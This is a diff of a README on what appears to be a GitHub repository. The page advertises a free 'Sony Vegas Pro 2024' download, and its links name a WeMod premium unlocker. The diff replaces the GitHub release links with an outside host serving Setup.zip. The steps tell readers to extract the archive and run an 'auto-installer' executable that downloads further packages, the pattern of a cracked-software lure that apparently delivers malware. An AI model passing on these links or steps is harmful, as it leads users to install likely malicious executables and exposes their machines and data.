@@ -13,11 +13,11 @@ Tags: Sony Vegas Pro 2024 free. Download Sony Vegas Pro 2024 for free. Download 
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/cc2806aa-4844-4b65-8cb6-cd04fe10c136)
-](https://github.com/Gabriel-Dias-Oliveira/Wemod-Premium-Unlocker-2024/releases/download/V5.5/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/Gabriel-Dias-Oliveira/Wemod-Premium-Unlocker-2024/releases/download/V5.5/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-17_20-39-17](https://github.com/user-attachments/assets/d2688ebe-0528-4011-8856-dcfc03e8f1da)
